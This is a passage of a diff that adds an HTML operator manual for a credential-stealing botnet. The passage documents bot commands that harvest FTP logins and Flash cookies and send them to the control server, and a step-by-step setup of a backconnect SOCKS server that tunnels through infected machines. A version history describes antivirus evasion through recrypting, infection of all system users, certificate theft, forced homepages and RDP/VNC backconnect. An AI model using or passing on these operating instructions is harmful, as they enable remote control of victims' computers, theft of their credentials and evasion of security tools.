+        <td>Force the setting of homepage to "http://www.google.com/".</td>
+      </tr>
+      <tr>
+        <td>user_homepage_set</td>
+        <td>Forcing the homepage will be disabled.</td>
+      </tr>
+    </table>
+  </li>
+  
+  <li><p><b>user_ftpclients_get</b></p>
+    <p>Get a list of all FTP-logins of all known FTP-clients. <i>This command is not available in all builds of the software.</i></p>
+  </li>
+  
+  <li><p><b>user_flashplayer_get</b></p>
+    <p>Create an archive "flashplayer.cab" from (*.sol) cookies of Adobe Flash Player (%APPDATA%\Macromedia\Flash Player) of the current user, and send it to the server.</p>
+  </li>
+  
+  <li><p><b>user_flashplayer_remove</b></p>
+    <p>Remove all (*.sol) cookies of Adobe Flash Player (%APPDATA%\Macromedia\Flash Player) of the current user.</p>
+  </li>
+</ul>
+<!-- КОНЧАЛО: Панель управления: Команды, используемые в скриптах -->
+
+<!-- НАЧАЛО: Работа с Backсonnect-сервером -->
+<h2 id="bc">Working with the Backonnect-server</h2>
+<p>Working with the BackConnect with example.</p>
+<ul>
+  <li>Backconnect-server IP-address: 192.168.100.1.</li>
+  <li>Port for bot: 4500.</li>
+  <li>Port for the client application: 1080.</li>
+  <li>Bot service: socks.</li>  
+</ul>
+<ol>
+  <li><p>Run a server application (zsbcs.exe or zsbcs64.exe) on the server having its own IP-address on the Internet, for application indicated port, which waits for a connection from a bot, and the port which will connect the client application. For example zsbcs.exe listen -cp:1080 -bp:4500, where 1080 - client port, 4500 - port for the bot.</p></li>
+  <li><p>Necessary to send command to bot "<a href="#bot_bc_add">bot_bc_add</a> socks 192.168.100.1 4500".</p></li>
+  <li><p>Now you need to wait for a connection from the bot to the server, in this period, any attempt to connect the client application will be ignored (will take disconnect from the client). The sign of the connected bot will be output to the console server line "Accepted new conection from bot...".</p></li>
+  <li><p>After connecting the bot, you can work with your client application. I.e. You simply connect to the server to the client port (in this case 1080). For example, if you are giving socks commands, then on the client port you would expect Socks-server.</p></li>
+  <li><p>After that, when you do not need Backconnect from the bot for a specific service, should issue the command "<a href="#bot_bc_remove">bot_bc_remove</a> socks 192.168.100.1 4500".</p></li>
+</ol>
+<p><b>NOTES:</b></p>
+<ol>
+  <li>You can specify any number of Backconnects (i.e. bot_bc_add), but they should not be a common combination of IP + Port. But if there is such a combination, will run the first added.</li>
+  <li>For each Backconnect, you must run a separate server application.</li>
+  <li>In case of disconnection (server down, drop bot, etc.), the bot will reconnect to the server indefinitely (even after restarting PC), until Backconnect will not be removed (i.e. bot_bc_remove).</li>
+  <li>As a service for bot_bc_add, you can use any open port at the address 127.0.0.1.</li>
+  <li>Server application supports IPv6, but currently this support is not particularly relevant.</li>
+  <li>You can launch the server application under Wine. Writing the same elf application is not currently scheduled.</li>
+  <li>It is highly recommended to use for the bp server application popular ports (80, 8080, 443 etc.), i.e. other ports may be blocked by the provider that owns the bot.</li>
+  <li>Not to be allowed to subscribe different bots on one and the same server port at the same time.</li>
+  <li>The method of such a connection might be useful for bots, which are outside the NAT, i.e. sometimes WIndows firewall of providers, may block the Internet connection.</li>
+</ol>
+<!-- КОНЧАЛО: Работа с Backсonnect-сервером -->
+
+<!-- НАЧАЛО: F.A.Q. -->
+<h2 id="faq">F.A.Q.</h2>
+<ul>
+  <li>
+    <p><b>What do the numbers in the version?</b></p>
+    <p>Format version <b>a</b>.<b>b</b>.<b>c</b>.<b>d</b>, where:</p>
+    <ul>
+      <li><b>a</b> - a complete change in the bot device.</li>
+      <li><b>b</b> - major changes, that cause complete or partial incompatibility with previous versions.</li>
+      <li><b>c</b> - bug fixes, improvements, adding features.</li>
+      <li><b>d</b> - cleaning issue from antivirus for the current version a.b.c.</li>
+    </ul>
+  </li>
+  <li>
+    <p><b>How is generated Bot ID?</b></p>
+    <p>Bot ID consists of two parts: %name%_%number%, where name - computer name (result of GetComputerNameW), a number - a certain number, generated based on some unique OS data.</p>
+  </li>
+  <li>
+    <p><b>Why traffic is encrypted with symmetric encryption method (RC4), but not asymmetric (RSA)?</b></p>
+    <p>Because, in the use of sophisticated algorithms it makes no sense, encryption only needs to hide traffic. Plus in the RSA only, not knowing the key that is in the Control panel, will not be able to emulate its answers. And what's the point to defend against this?</p>
+  </li>
+</ul>
+<!-- КОНЧАЛО: F.A.Q. -->
+
+<!-- НАЧАЛО: История версий -->
+<h2 id="history">Version history</h2>
+<ul>
+  <li><p><b>Version 2.0.0.0, 01.04.2010</b></p><ol>
+    <li>Full compatible with previous versions.</li>
+    <li>Since the core of the bot is aimed at Windows Vista+, and the bot will never use privilege escalation, etc., bot is working within a single user. But the basic attempts to infect other Windows users are made (usually effective in cases of disabling UAC, or run from under LocalSystem).</li>
+    <li>Arbitrary file names, mutexes, etc.</li>
+    <li>Completely rewritten bot core, the installation process in the system to send reports to the Control panel.</li>
+    <li>At installation, the bot recrypts his body, thus preserves a unique copy of the exe-file on each computer.</li>
+    <li>Binding bot to computer by modifying/deleting some data in the exe-file.</li>
+    <li>Valuable work with x32 applications in Windows x64.</li>
+    <li>Delete the original bot file, after execution, regardless of the outcome of performance.</li>
+    <li>Valuable work in parallel sessions for "Terminal Services".</li>
+    <li>When run as the LocalSystem user, an attempt is made to infect all system users.</li>
+    <li>Removed the option "StaticConfig.blacklist_languages".</li>
+    <li>The name of the botnet is limited to 20 characters and can contain any international characters.</li>
+    <li>The configuration file is read in UTF-8 encoding.</li>
+    <li>Removed the option "StaticConfig.url_compip".</li>
+    <li>A new method for determining the NAT.</li>
+    <li>You can not upgrade a new version of the bot on an old one.</li>
+    <li>When updating bot is a complete update immediately, without waiting for a reboot.</li>
+    <li>At the moment, due to some reasons, hide bot files will not run at all.</li>
+    <li>Removed "Protected Storage" grabber, because starting with IE7, it is no longer used.</li>
+    <li>With regard to the unreliability of the old system of counting "Installs" the bot is counted automatically as "Install" when added to database.</li>
+    <li>A new way to get IE cookies.</li>
+    <li>Improved back-connect protocol.</li>
+    <li>Because the "light-mode" builder is designed to test and debug HTTP-injects and HTTP-fakes, it has some limitations on assembly of the configuration file.</li>
+    <li>Complicated to discover the bot traffic.</li>
+    <li>Complete (as with wininet.dll) to work with nspr4.dll, but without HTTP-fakes.</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.1.0, 28.04.2010</b></p>Now using an external crypter, with respect to these canceled some features of the previous version:<ol>
+    <li>Modified to bind to the user/OS.</li>
+    <li>Bot is no longer able to recrypt itself during installation.</li>
+    <li>Minor improvements to HTTP-injects.</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.2.0, 10.05.2010</b></p><ol>
+    <li>Forced change of Mozilla Firefox security settings for normal HTTP-injects.</li>
+    <li>Command "user_homepage_set" uses home page is mandatory for IE and Firefox (i.e. the page will be restored even if the user makes a change) as long as no command is canceled.</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.3.0, 19.05.2010</b></p><ol>
+    <li>With regard to the fact that HTTP-injects are mostly written by people who understand little of HTTP, HTML, etc., removed warning "*NO MATCHES FOUND FOR CURRENT MASK*". Because due to abuse of the mark "*" masked URL, this warning appears very often.</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.4.0, 31.05.2010</b></p><ol>
+    <li>In control panel, fixed a bug in the module "Botnet-> Bots", which does not allow to search by IP.</li>
+    <li>In the configuration file, added the option "StaticConfig.remove_certs", to disable the automatic deletion of certificates from the user store when install the bot.</li>
+    <li>In the configuration file, added the option "StaticConfig.disable_tcpserver", which allows you to disable the TCP-server (DISABLE: socks-server, screenshots in real time). This option is introduced to prevent warnings from the "Windows Firewall".</li>
+    <li>Ripped certificates stored on the server with an indication of the user, from which they are received.</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.5.0, 08.06.2010</b></p><ol>
+    <li>For scripts added commands "bot_httpinject_enable" an "bot_httpinject_disable".</li>
+    <li>Fixed minor bugs in HTTP-grabber.</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.6.0, 22.06.2010</b></p><ol>
+    <li>In nspr4.dll, in a particular format of the HTTP-response from server, this reply was not analyzed correctly (resulting, for example, in disabling the HTTP-injects).</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.7.0, 15.07.2010</b></p><ol>
+    <li>Disable the built-in bot encryption.</li>
+  </ol></li>
+
+  <li><p><b>Version 2.0.8.0, 17.08.2010</b></p><ol>
+    <li>To the parameters HTTP-injects was added a new option "I" (compare URL insensitive) and "C" (comparison of context insensitive). </li>
+  </ol></li>
+   <li><p><b>Version 2.1.0.0, 20.03.2011</b></p><ol>
+    <li>RDP + VNC BACKCONNECT ADDED </li>
+  </ol></li>
+</ul>
+<!-- КОНЧАЛО: История версий -->
+
+</body>
+</html>
